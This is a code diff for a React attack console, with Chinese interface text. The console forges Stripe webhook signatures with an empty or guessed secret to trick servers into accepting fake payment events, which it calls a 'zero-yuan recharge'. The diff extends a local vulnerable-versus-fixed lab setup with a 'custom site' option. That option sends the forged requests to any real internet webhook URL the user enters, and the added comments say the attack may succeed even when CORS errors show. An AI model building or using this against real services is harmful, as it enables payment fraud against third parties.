@@ -1,20 +1,21 @@
 import React, { useState } from 'react';
-import { Terminal, Shield, ShieldAlert, Zap, Server, Code, Activity, CheckCircle, XCircle } from 'lucide-react';
+import { Terminal, Shield, ShieldAlert, Zap, Server, Code, Activity, CheckCircle, XCircle, Globe } from 'lucide-react';
 import CryptoJS from 'crypto-js';
 import clsx from 'clsx';
 
 // Types
-type TargetEnv = 'vuln' | 'fixed';
+type TargetEnv = 'vuln' | 'fixed' | 'custom';
 
 interface LogEntry {
   time: string;
-  type: 'info' | 'success' | 'error' | 'request' | 'response';
+  type: 'info' | 'success' | 'error' | 'request' | 'response' | 'warning';
   message: string;
   details?: any;
 }
 
 function App() {
   const [target, setTarget] = useState<TargetEnv>('vuln');
+  const [customUrl, setCustomUrl] = useState('https://your-test-site.com/api/stripe/webhook');
   const [clientId, setClientId] = useState('USR-9999-HACK-123456');
   const [amount, setAmount] = useState(9999);
   const [secret, setSecret] = useState('');
@@ -66,7 +67,10 @@ function App() {
     const signature = forgeSignature(jsonBody, secret, timestamp);
     addLog('info', `生成签名 (Stripe-Signature): ${signature}`);
 
-    const endpoint = target === 'vuln' ? '/api/vuln/api/stripe/webhook' : '/api/fixed/api/stripe/webhook';
+    let endpoint = '';
+    if (target === 'vuln') endpoint = '/api/vuln/api/stripe/webhook';
+    else if (target === 'fixed') endpoint = '/api/fixed/api/stripe/webhook';
+    else endpoint = customUrl;
     
     addLog('request', `POST ${endpoint}`, {
       headers: {
@@ -75,6 +79,10 @@ function App() {
       },
       body: payload
     });
+
+    if (target === 'custom') {
+      addLog('warning', '⚠️ 注意：正在向外部域名发送跨域请求 (CORS)。如果目标服务器未配置允许浏览器跨域访问，请求可能会在浏览器端被拦截并显示失败。');
+    }
 
     try {
       const response = await fetch(endpoint, {
@@ -91,12 +99,12 @@ function App() {
       addLog('response', `服务端响应状态码: ${response.status} ${response.statusText}`, responseText);
 
       if (response.ok) {
-        addLog('success', '🎉 攻击成功！服务端已接受伪造的请求并执行了充值逻辑。');
+        addLog('success', '🎉 攻击成功！服务端已接受伪造的请求并执行了业务逻辑。');
       } else {
         addLog('error', '❌ 攻击失败，服务端拒绝了伪造请求。');
       }
     } catch (error: any) {
-      addLog('error', `网络请求失败: ${error.message}`);
+      addLog('error', `网络请求失败: ${error.message} (如果您测试的是外部站点，这通常是因为目标服务器未允许 CORS 跨域请求)`);
     } finally {
       setIsHacking(false);
     }
@@ -142,31 +150,61 @@ function App() {
               {/* Target Env */}
               <div className="space-y-2">
                 <label className="text-[10px] sm:text-xs font-semibold text-slate-400 uppercase tracking-wider">目标环境</label>
-                <div className="grid grid-cols-2 gap-2 sm:gap-3">
+                <div className="grid grid-cols-3 gap-2 sm:gap-2">
                   <button
                     onClick={() => setTarget('vuln')}
-                    className={`flex flex-col items-center justify-center p-2 sm:p-3 rounded-lg border transition-all ${
+                    className={`flex flex-col items-center justify-center p-2 rounded-lg border transition-all ${
                       target === 'vuln' 
                         ? 'border-rose-500 bg-rose-500/10 text-rose-400' 
                         : 'border-slate-700 bg-slate-800 text-slate-400 hover:border-slate-600'
                     }`}
                   >
                     <Server className="w-4 h-4 sm:w-5 sm:h-5 mb-1" />
-                    <span className="text-xs sm:text-sm font-medium mt-1">漏洞版 (:8080)</span>
+                    <span className="text-[10px] sm:text-xs font-medium mt-1">漏洞版 (本地)</span>
                   </button>
                   <button
                     onClick={() => setTarget('fixed')}
-                    className={`flex flex-col items-center justify-center p-2 sm:p-3 rounded-lg border transition-all ${
+                    className={`flex flex-col items-center justify-center p-2 rounded-lg border transition-all ${
                       target === 'fixed' 
                         ? 'border-emerald-500 bg-emerald-500/10 text-emerald-400' 
                         : 'border-slate-700 bg-slate-800 text-slate-400 hover:border-slate-600'
                     }`}
                   >
                     <Shield className="w-4 h-4 sm:w-5 sm:h-5 mb-1" />
-                    <span className="text-xs sm:text-sm font-medium mt-1">安全版 (:8081)</span>
+                    <span className="text-[10px] sm:text-xs font-medium mt-1">安全版 (本地)</span>
+                  </button>
+                  <button
+                    onClick={() => setTarget('custom')}
+                    className={`flex flex-col items-center justify-center p-2 rounded-lg border transition-all ${
+                      target === 'custom' 
+                        ? 'border-indigo-500 bg-indigo-500/10 text-indigo-400' 
+                        : 'border-slate-700 bg-slate-800 text-slate-400 hover:border-slate-600'
+                    }`}
+                  >
+                    <Globe className="w-4 h-4 sm:w-5 sm:h-5 mb-1" />
+                    <span className="text-[10px] sm:text-xs font-medium mt-1">自定义站点</span>
                   </button>
                 </div>
               </div>
+
+              {/* Custom URL Input (Conditional) */}
+              {target === 'custom' && (
+                <div className="space-y-2 animate-in fade-in slide-in-from-top-2 duration-200">
+                  <label className="text-[10px] sm:text-xs font-semibold text-indigo-400 uppercase tracking-wider flex items-center gap-1">
+                    <Globe className="w-3 h-3" /> 自定义 Webhook URL
+                  </label>
+                  <input
+                    type="url"
+                    value={customUrl}
+                    onChange={(e) => setCustomUrl(e.target.value)}
+                    placeholder="https://..."
+                    className="w-full bg-indigo-950/20 border border-indigo-500/30 rounded-lg px-3 sm:px-4 py-2 sm:py-2.5 text-sm text-indigo-200 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all placeholder:text-indigo-800/50 font-mono"
+                  />
+                  <p className="text-[10px] sm:text-[11px] text-slate-500 leading-tight">
+                    输入您要测试的互联网真实 Webhook 端点。由于浏览器跨域 (CORS) 限制，您的请求可能会被浏览器拦截（即使攻击本身可能有效）。
+                  </p>
+                </div>
+              )}
 
               {/* Secret Key */}
               <div className="space-y-2">
@@ -178,7 +216,7 @@ function App() {
                   placeholder="留空以执行空密钥攻击"
                   className="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 sm:px-4 py-2 sm:py-2.5 text-sm text-slate-300 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all placeholder:text-slate-600 font-mono"
                 />
-                <p className="text-[10px] sm:text-xs text-slate-500 leading-tight">用于对请求载荷进行签名的 Stripe HMAC 密钥。</p>
+                <p className="text-[10px] sm:text-[11px] text-slate-500 leading-tight">用于对请求载荷进行签名的 Stripe HMAC 密钥。</p>
               </div>
 
               {/* Client ID */}
@@ -240,9 +278,9 @@ function App() {
               {[
                 { step: 1, text: "构造虚假订单会话载荷 (Payload)" },
                 { step: 2, text: "使用空密钥对载荷进行哈希计算" },
-                { step: 3, text: "向 /api/stripe/webhook 发送 POST 请求" },
+                { step: 3, text: "向指定的 Webhook URL 发送 POST 请求" },
                 { step: 4, text: "服务端验证签名 (若密钥为空则验证通过)" },
-                { step: 5, text: "成功执行“零元充值”业务逻辑" },
+                { step: 5, text: "成功触发目标的业务逻辑" },
               ].map((item, idx) => (
                 <div key={idx} className="flex items-start gap-3">
                   <div className="w-5 h-5 sm:w-6 sm:h-6 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center text-[10px] sm:text-xs font-mono text-slate-400 shrink-0">
@@ -292,11 +330,13 @@ function App() {
                           log.type === 'info' && "text-blue-400",
                           log.type === 'success' && "text-emerald-400 font-bold",
                           log.type === 'error' && "text-rose-400 font-bold",
+                          log.type === 'warning' && "text-amber-500 font-semibold",
                           log.type === 'request' && "text-amber-400",
                           log.type === 'response' && "text-purple-400"
                         )}>
                           {log.type === 'success' && <CheckCircle className="w-3.5 h-3.5 sm:w-4 sm:h-4 inline mr-1 sm:mr-1.5 -mt-0.5 sm:-mt-1" />}
                           {log.type === 'error' && <XCircle className="w-3.5 h-3.5 sm:w-4 sm:h-4 inline mr-1 sm:mr-1.5 -mt-0.5 sm:-mt-1" />}
+                          {log.type === 'warning' && <ShieldAlert className="w-3.5 h-3.5 sm:w-4 sm:h-4 inline mr-1 sm:mr-1.5 -mt-0.5 sm:-mt-1" />}
                           {log.message}
                         </span>
 
